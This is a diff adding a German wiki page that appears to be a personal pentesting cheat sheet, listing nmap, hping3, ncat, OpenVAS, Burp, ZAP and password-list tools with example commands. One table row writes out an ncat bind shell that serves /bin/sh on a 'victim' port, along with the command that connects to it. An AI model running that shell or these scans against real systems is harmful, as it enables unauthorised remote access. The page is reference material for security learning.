@@ -1,0 +1,139 @@
+
+<h1 class="sectionedit1" id="helfer_in_der_not">Helfer in der Not</h1>
+<div class="level1">
+<div class="table sectionedit2"><table class="inline">
+	<thead>
+	<tr class="row0">
+		<th class="col0 leftalign"> Kommando      </th><th class="col1 leftalign"> Beschreibung      </th><th class="col2"> Beispiel</th><th class="col3"> Erklärung </th>
+	</tr>
+	</thead>
+	<tr class="row1">
+		<td class="col0 leftalign"> classic <strong>nmap</strong>    </td><td class="col1 leftalign"> Portscanner    </td><td class="col2"> nmap -sS -A -P0 192.168.1.0/24 </td><td class="col3">scant das 1 Netz nach offnen Ports</td>
+	</tr>
+	<tr class="row2">
+		<td class="col0 leftalign"> hping3   </td><td class="col1"> analysiert icmp oder tcp  Pakete (alternative zu ping) </td><td class="col2">hping3 -S -p 443 jonnybravoserver.de</td><td class="col3">der Port 443 wird gepingt (istereichbar obwohl icmp auf deny steht</td>
+	</tr>
+	<tr class="row3">
+		<td class="col0">Ncat</td><td class="col1"> Ncat ist der inofizelle Nachfolger von netcat Netzwerkpor :) </td><td class="col2">&lt;opfer&gt;#<strong>nohub ncat -l 10023 -n -e /bin/sh &amp; </strong> &lt;hack&gt;#<strong>ncat -nvv  opferrechner 10023</strong></td><td class="col3"> In diesem Beispiel wird eine Shell auf den Port 10023 gelenkt (nach Reboot gibts die verbindung nicht mehr)</td>
+	</tr>
+	<tr class="row4">
+		<td class="col0">netdiscover</td><td class="col1">sendet ARP Requests und wartet auf Rückmeldung danach ordnet er jeder ip die mac zu</td><td class="col2">netdiscover -r 192.168.50.0/24 -i wlan0</td><td class="col3">prüft das 50 Netz auf der Netzwerkadapter Wlan0</td>
+	</tr>
+	<tr class="row5">
+		<td class="col0">p0f</td><td class="col1">dient der passiven Erkennung der im Einssatz befindlichen <abbr title="Operating System">OS</abbr> (analysiert die tcp/ip Struktur)</td><td class="col2">p0f -i wlan0</td><td class="col3">pürft alle verbindungen die auf den wlan0 Adapter eingehen und gibt die <abbr title="Operating System">OS</abbr> Version aus</td>
+	</tr>
+	<tr class="row6">
+		<td class="col0">xprobe2</td><td class="col1">gibt einen ersten guten Einblick in einem Unbekannten  Netz dar (<abbr title="Operating System">OS</abbr>, Kernelversion,ip,module)</td><td class="col2">xprobe2 192.168.50.0/24</td><td class="col3">checkt das 50 Netz :) </td>
+	</tr>
+</table></div>
+<!-- EDIT2 TABLE [35-1188] -->
+</div>
+<!-- EDIT1 SECTION "Helfer in der Not" [1-1191] -->
+<h1 class="sectionedit3" id="vulnerability_analysis">Vulnerability Analysis</h1>
+<div class="level1">
+
+<p>
+<strong>OpenVAS</strong> Installatrionskurzanleitung
+</p>
+
+<p>
+Mit foglenden 3 Befehlen wird OpenVas installiert 
+</p>
+
+<p>
+<pre class="code bash">Openvas-setup
+&nbsp;
+openvas-scapdata-sync
+&nbsp;
+openvas-check-setup</pre>
+
+</p>
+
+<p>
+Nach erfolgreicher Installation kann es über den Port 9392 angesprochen werden <a href="https://localhost:9392" class="urlextern" title="https://localhost:9392"  rel="nofollow">https://localhost:9392</a>. 
+</p>
+
+<p>
+Weitere OpenVAS Befehle 
+</p>
+<div class="table sectionedit4"><table class="inline">
+	<thead>
+	<tr class="row0">
+		<th class="col0 leftalign">Kommando      </th><th class="col1 leftalign"> Beschreibung      </th>
+	</tr>
+	</thead>
+	<tr class="row1">
+		<td class="col0">opernvas-nvt-sync</td><td class="col1">Aktualisierung des NVT-Feeds</td>
+	</tr>
+	<tr class="row2">
+		<td class="col0">scapdata-sync</td><td class="col1">Aktualisierung des SCAP Feeds (optional)</td>
+	</tr>
+	<tr class="row3">
+		<td class="col0">openvas-certdata-sync</td><td class="col1">Aktualisierung des CERTS Feeds (optional)</td>
+	</tr>
+	<tr class="row4">
+		<td class="col0">openvassd -a 127.0.0.1 -p 9391 </td><td class="col1">Start des Scanners</td>
+	</tr>
+	<tr class="row5">
+		<td class="col0">openvasmd -a 127.0.0.1 -p 9390 </td><td class="col1">Start des Managers von OpenVAS</td>
+	</tr>
+	<tr class="row6">
+		<td class="col0">openvasad -a 127.0.0.1 -p 9393 </td><td class="col1">Start der Adminconsole von OpenVAS</td>
+	</tr>
+	<tr class="row7">
+		<td class="col0">gsad -p 9392</td><td class="col1">Start der Greenbone Security Assistant Daemon mit Angabe des Ports</td>
+	</tr>
+</table></div>
+<!-- EDIT4 TABLE [1535-2012] -->
+<p>
+Kurzbeispiel : 
+</p>
+
+<p>
+Über konfiguration\Ziele werden die Ziele definiert (Sternsymbol) !
+Im Scanmanagment werden die Scanjobs erstellt 
+</p>
+
+<p>
+Nessus ist profitorientiert und keine wahl für mich,  scheiß Kapitalisten !
+</p>
+
+<p>
+<strong>Web Applications</strong>
+</p>
+<div class="table sectionedit5"><table class="inline">
+	<thead>
+	<tr class="row0">
+		<th class="col0 leftalign">Werkzeug      </th><th class="col1 leftalign"> Beschreibung      </th><th class="col2">Beispiel </th><th class="col3">Web Link </th>
+	</tr>
+	</thead>
+	<tr class="row1">
+		<td class="col0">BurpSuite</td><td class="col1" colspan="2"> in Java basierender Netzwerkanalyse-Werkzeugkasten</td><td class="col3"><a href="https://portswigger.net/buy/" class="urlextern" title="https://portswigger.net/buy/"  rel="nofollow">https://portswigger.net/buy/</a></td>
+	</tr>
+	<tr class="row2">
+		<td class="col0">OWASP Zed Attack Proxy</td><td class="col1" colspan="2">Wird zur Analyse von Webanwendungen verwendet </td><td class="col3"><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" class="urlextern" title="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"  rel="nofollow">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></td>
+	</tr>
+</table></div>
+<!-- EDIT5 TABLE [2249-2535] -->
+<p>
+<strong>Password Attacks </strong>
+</p>
+<div class="table sectionedit6"><table class="inline">
+	<thead>
+	<tr class="row0">
+		<th class="col0 leftalign">Werkzeug     </th><th class="col1">Beschreibung </th><th class="col2">Beispiel </th><td class="col3"></td><td class="col4"></td>
+	</tr>
+	</thead>
+	<tr class="row1">
+		<td class="col0 leftalign">crunch   </td><td class="col1">Mit Crunch werden Wörtbücher erstellt </td><td class="col2">crunch 4 4 1234</td><td class="col3">Die Ausgabe sind alle kominationen von 1234 mit 4 stellen </td><td class="col4"></td>
+	</tr>
+	<tr class="row2">
+		<td class="col0">PW-Inspector</td><td class="col1">optimiert Passwortlisten (gehört zur hydra-suite :) )</td><td class="col2"> cat password.lst </td><td class="col3">pw-inspector -m 3 -M 5</td><td class="col4">In diesem Beispiel werden nur die Zeichen zwischen 3 und 5 ausgegeben </td>
+	</tr>
+	<tr class="row3">
+		<td class="col0">oclHashcat</td><td class="col1">Multi-hash-fähiger Passwortknacker( top speed) alle Protokolle mysql mssql usw.</td><td class="col2"></td><td class="col3"></td><td class="col4"></td>
+	</tr>
+</table></div>
+<!-- EDIT6 TABLE [2561-3027] -->
+</div>
+<!-- EDIT3 SECTION "Vulnerability Analysis" [1192-] -->
